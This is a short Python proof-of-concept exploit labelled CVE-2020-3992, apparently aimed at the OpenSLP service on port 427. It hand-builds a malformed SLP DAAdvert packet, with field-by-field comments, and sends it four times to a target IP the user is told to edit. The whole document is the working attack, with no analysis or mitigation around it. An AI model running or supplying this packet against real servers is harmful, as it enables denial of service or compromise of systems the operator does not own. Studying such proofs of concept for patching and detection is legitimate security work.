import socket
################## CVE-2020-3992 ##################
#        version   funcid     length           flag           extoffset        xid          langtaglen    langtag
header = b"\x02"  +b"\x08" + b"\x00\x00\x49" + b"\x00\x00" + b"\x00\x00\x00" + b"\x00\x00" +b"\x00\x02" + b"\x65\x6e"
#           errorcode    bootstamp             urllen        url             scopelistlen   scopelist       attrlistlen   attrlist        spilistlen  spilist   authcount
daadvert = b"\x00\x00" + b"\x00\x00\x01\x00" + b"\x00\x14" + b"http://www.baidu.com" + b"\x00\x0a"  + b"abcdefghij" + b"\x00\x0a" + b"pppppppppp" + b"\x00\x02" +b"bb"  + b"\x00"
poc = header + daadvert
tcpClientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Edit your server ip
serverAddr = ('192.168.110.129',427)
tcpClientSocket.connect(serverAddr)
print('connect success!')
tcpClientSocket.send(poc)
tcpClientSocket.send(poc)
tcpClientSocket.send(poc)
tcpClientSocket.send(poc)
tcpClientSocket.close()
print('close socket!')
